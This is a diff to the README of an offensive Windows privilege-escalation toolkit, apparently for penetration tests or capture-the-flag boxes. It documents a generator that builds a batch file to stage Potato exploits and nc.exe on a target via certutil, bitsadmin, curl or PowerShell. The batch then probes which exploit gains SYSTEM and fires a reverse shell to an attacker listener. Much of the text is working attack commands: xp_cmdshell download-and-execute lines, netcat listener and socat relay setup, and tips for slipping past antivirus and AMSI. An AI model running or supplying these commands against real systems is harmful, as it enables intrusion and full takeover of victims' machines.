@@ -89,40 +89,51 @@ Set `TOOL` in **`_winpriv_common.py`** (one place, all three scripts read it); d
 
 `<CMD>` = `powershell -e <REV_B64>` (the SYSTEM revshell) for every tool. **Swap `TOOL`, re-run the same generator — no per-tool setup.**
 
-## Which Potato works here? — `gen_potato_scan.py` stages + probes all of them for you
-Modern-patched Windows (KB5004442 DCOM hardening + friends) breaks *different* Potato callback paths on different boxes — SweetPotato may hang, GodPotato may return 1058, RoguePotato may spawn nothing. Rather than editing `TOOL` and re-running gen_full/forma/nonet between attempts — **and** hand-writing certutil fetch lines per Potato — this one generator does it all end-to-end:
+## The one-paste path — `gen_potato_scan.py --fire` (Route 1, end to end)
+For 90% of Route-1 engagements you now don't need `gen_full` / `gen_forma` / `gen_nonet` at all. This one script stages every Potato you have, probes them, picks the winner, and fires the SYSTEM revshell — in a single batch you paste once:
 
 ```bash
-# put every Potato exe you have in a dir:
-mkdir -p ~/potatoes && cp EfsPotato.exe SharpEfsPotato.exe GodPotato-NET4.exe ... ~/potatoes/
-cd ~/potatoes && sudo python3 -m http.server 80 &
+# put every Potato exe you have (plus nc.exe) in a dir on Kali:
+mkdir -p ~/potatoes && cp EfsPotato.exe SharpEfsPotato.exe GodPotato-NET4.exe nc.exe ~/potatoes/
 
-# emit ONE batch: auto-detects which exes YOU have + emits stage + scan for those
-python3 gen_potato_scan.py --serve-dir ~/potatoes > pscan.bat
-python3 -m http.server 80    # or reuse the http.server started above
+# emit ONE batch that does the whole route with your listener addr:
+python3 gen_potato_scan.py --serve-dir ~/potatoes --fire --revtype nc --lhost 10.10.14.7 --lport 443 > run.bat
+cp run.bat ~/potatoes/
+
+# start the listener FIRST, then serve:
+nc -lvnp 443 &
+cd ~/potatoes && sudo python3 -m http.server 80
 ```
 
 On target (via mssqlclient / xp_cmdshell):
 ```sql
-EXEC master..xp_cmdshell 'certutil -urlcache -f http://<LHOST>/pscan.bat C:\Windows\Temp\pscan.bat';
-EXEC master..xp_cmdshell 'C:\Windows\Temp\pscan.bat';
+EXEC master..xp_cmdshell 'certutil -urlcache -f http://<LHOST>/run.bat C:\Windows\Temp\run.bat';
+EXEC master..xp_cmdshell 'C:\Windows\Temp\run.bat';
 ```
 
-Per Potato the batch will:
-1. **STAGE**: try `certutil` → `bitsadmin` → `curl` → `powershell Net.WebClient` — each attempt verified (file present AND ≥ 1024 bytes; AV-nuked partials count as failure and roll to the next transport). Prints `[STAGED via <method> <size>B]` or `[FAILED: all four transports blocked or AV-nuked]`.
-2. **SCAN**: fire the staged exe against a benign `whoami > marker` probe (no revshell, no AV signal), hard-timeout any hang via `taskkill`, then classify — `[+] TOOL WORKS -- SYSTEM confirmed` or a specific `[-]` reason.
-3. **Summary**: which Potatoes staged, and the winner(s).
+The batch, in order:
+1. **STAGE**: each Potato + nc.exe via `certutil` → `bitsadmin` → `curl` → `powershell Net.WebClient`. Every attempt logs `[TRIED via X: exit=N bytes=M]` so you see the full transport chain, not just the winner. Size guard rejects AV-nuked 0-byte writes.
+2. **SCAN**: benign `whoami > marker` probe per staged Potato, hard-timeout hangs. Prints `[+] TOOL WORKS -- SYSTEM confirmed` per survivor.
+3. **FIRE**: picks first winner, runs the SYSTEM revshell (nc callback by default via the same nc.exe just staged; or `--revtype powershell` for a PS revshell).
+4. **Summary**: what staged, what won, that it fired.
 
-Set `TOOL` in `_winpriv_common.py` to a winner and re-run `gen_full` / `gen_forma` / `gen_nonet` as usual (same POTATOES_CMDLINE arg template = same result).
+## The manual path — `gen_potato_scan.py` (no `--fire`, then `gen_full`/`gen_forma`/`gen_nonet`)
+Same tool, without `--fire`: it stages + scans and stops. Set `TOOL` in `_winpriv_common.py` to the winner and use `gen_full` / `gen_forma` / `gen_nonet` as before. Useful when you want to review the winner before firing, or need a delivery variant `--fire` doesn't cover (e.g. `gen_nonet` for fully-fileless delivery).
 
-Flags:
-- `--serve-dir <path>` — where your local Potato exes live (default `.`). Only exes matching known Potato names are staged; other files in the dir are ignored.
+## Flags — every knob you'd otherwise edit in `_winpriv_common.py`
+- `--fire` — after scan, run the SYSTEM revshell on the first Potato that won. **One paste → shell.**
+- `--revtype nc|powershell` — revshell flavor (default from `_winpriv_common.py:REVTYPE`). `nc` avoids AMSI in the callback path when nc.exe survives your target's AV — otherwise `powershell`.
+- `--lhost <ip>` / `--lport <n>` — override the listener address baked into `_winpriv_common.py`, so you don't edit that file per engagement.
+- `--nc-path <path>` — target-side path to nc.exe for the fire payload (default `%STAGE%\nc.exe`).
+- `--serve-dir <path>` — where your local Potato exes (+ optionally nc.exe) live (default `.`). Only files matching known Potato names or `nc.exe` get staged.
 - `--serve-url http://x:8080` — non-80 HTTP server (default `http://LHOST`).
 - `--stagedir "D:\path"` — target-side landing dir (default from `_winpriv_common.py:STAGE`).
-- `--timeout 8` — per-probe hard-kill seconds (default 6).
-- `--include-rogue` — also probe RoguePotato (needs your `socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999` running).
-- `--no-stage` — skip stage phase (assume everything already on target).
-- `--no-scan` — stage only.
+- `--transport certutil|bitsadmin|curl|powershell` — try this transport FIRST; the others fall back after in default order (default: certutil first). If your target's AV kills certutil but curl walks straight through, set `--transport curl` to jump the queue.
+- `--verbose` — remove the `>nul 2>&1` redirects on stage attempts so you see each transport's actual error output instead of relying on the `[TRIED via X: exit=N bytes=M]` summary.
+- `--timeout 8` — per-probe hard-kill seconds (default 6). Bump for slow / hardened boxes.
+- `--include-rogue` — also probe RoguePotato (needs your `socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999` running on the attacker).
+- `--no-stage` — skip stage phase (assume every Potato already on target).
+- `--no-scan` — stage only, no probing.
 - Positional args (e.g. `EfsPotato.exe SharpEfsPotato.exe`) restrict the batch to those tools.
 
 ## Always-first setup
